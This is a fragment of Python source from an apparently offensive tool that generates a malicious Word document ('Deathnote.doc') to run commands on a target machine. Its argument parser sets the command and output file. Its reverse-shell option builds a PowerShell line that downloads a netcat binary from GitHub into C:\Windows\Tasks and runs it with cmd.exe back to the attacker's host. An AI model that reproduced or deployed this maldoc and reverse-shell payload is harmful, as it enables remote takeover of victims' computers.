...
parser.add_argument(
    ...
    "-c",
    default="notepad",
    help="command to run on the target (default: notepad)",
)

parser.add_argument(
    "--output",
    "-o",
    default="./Deathnote.doc",
    help="output maldoc file (default: ./Deathnote.doc)",
)
...
def main(args):
    ...
    if args.reverse:
        command = f"""Invoke-WebRequest https://github.com/Malwareman007/Deathnote/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
